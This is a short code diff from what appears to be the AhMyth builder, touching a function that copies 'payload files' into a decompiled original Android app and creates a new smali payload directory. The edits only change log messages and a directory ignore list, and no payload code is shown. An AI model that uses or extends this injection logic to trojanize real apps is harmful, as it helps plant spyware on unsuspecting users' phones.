@@ -343,7 +343,6 @@ app.controller("AppCtrl", ($scope) => {
   // and if success go to generate the apk
   $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
 
-    delayedLog('[★] Copying AhMyth Payload Files to Original App...');
     delayedLog('[★] Reading the Original Decompiled APK...')
     fs.readdir(apkFolder, {
       withFileTypes: true
@@ -360,7 +359,8 @@ app.controller("AppCtrl", ($scope) => {
         'lib',
         'assets',
         'META-INF',
-        'unknown'];
+        'unknown',
+        'smali_assets'];
       var smaliList = files
         .filter((item) => item.isDirectory() &&
           !(ignoreDirs.includes(item.name)))
@@ -371,8 +371,7 @@ app.controller("AppCtrl", ($scope) => {
       smaliList.sort((a, b) => collator.compare(a, b));
       var lastSmali = smaliList[smaliList.length - 1];
       if (lastSmali == "smali") {
-        delayedLog('[★] Creating the new Smali Payload Directory...')
-
+        delayedLog('[★] Creating the new Smali Payload Directory...');
         fs.mkdir(apkFolder + "/smali_classes2", {
           recursive: true
         }, error => {
